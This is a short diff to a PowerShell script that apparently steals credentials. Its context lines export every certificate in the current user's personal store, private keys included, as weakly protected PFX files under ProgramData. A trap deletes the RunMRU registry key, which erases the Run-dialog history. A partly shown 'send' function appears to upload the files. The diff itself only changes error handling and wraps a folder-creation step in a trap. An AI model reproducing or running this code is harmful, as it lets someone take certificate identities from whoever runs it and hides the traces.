@@ -1,4 +1,4 @@
-$ErrorActionPreference = "SilentlyContinue"
+$ErrorActionPreference = "Continue"
 trap{C:\Windows\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f}
 function send($f) {
     $TargetFilePath = "/c/$f"
@@ -15,7 +15,7 @@ function send($f) {
 
 C:
 cd C:\ProgramData\cloudpath_data\
-mkdir found
+trap{mkdir found}
 cd found
 $p = ConvertTo-SecureString -String '.' -Force -AsPlainText
 gci Cert:\CurrentUser\My\|%{Export-PfxCertificate $_ "C:\ProgramData\cloudpath_data\found\$($_.Thumbprint)" -Password $p}
